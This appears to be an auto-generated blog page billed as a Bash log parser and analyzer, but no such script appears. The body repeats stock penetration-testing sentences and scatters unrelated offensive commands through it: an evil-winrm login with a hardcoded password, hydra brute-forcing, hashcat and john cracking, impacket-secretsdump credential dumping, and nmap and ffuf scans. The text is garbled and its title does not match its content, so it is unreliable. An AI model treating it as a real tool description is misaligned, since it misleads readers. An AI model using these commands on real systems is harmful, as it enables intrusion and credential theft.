---
TitleSEO: "Log Parser and Analyzer in Bash | ZureFX"
TitlePost: "Log Parser and Analyzer — Bash"
Author: "ZureFX"
Description: "A Bash script for log parser and analyzer. Built for security research and automation."
Keywords: "parser, tool, scanner, bash"
URL: "https://zurefx.github.io/scripting/script-log-parser-and-analyzer-663.html"
URL_IMAGES: ""
Date: "2024-05-04"
Tags: "Parser, Tool, Scanner, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-log-parser-and-analyzer-663"
Permalink: "/scripting/script-log-parser-and-analyzer-663.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit. The service was running without proper input validation, leading to injection vulnerabilities.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `ldapsearch`
- `pwncat`
- `evil-winrm`

## Implementation

### Core Logic

Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality.

```bash
evil-winrm -i 10.16.118.13 -u administrator -p 'P@ssw0rd!'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

### Helper Functions

The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.57.45.228 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Usage

### Basic Usage

The service account had excessive permissions assigned in Active Directory. Weak file permissions allowed modification of critical system files.

```bash
nmap -sCV -p139,5432,445 10.110.26.26 -oN scan.txt
nmap -sCV -p80,25,1433 10.128.237.115 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.56.70.161/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Advanced Options

Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
nmap -sCV -p5986,27017,8080 10.104.35.88 -oN scan.txt
nmap -sCV -p53,5432,5432 10.12.138.216 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.122.193.47
```

## Output

### Example Output

The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials.

```
[+] Scanning target...
[+] Found 17 results
[+] Done in 4.47s
```
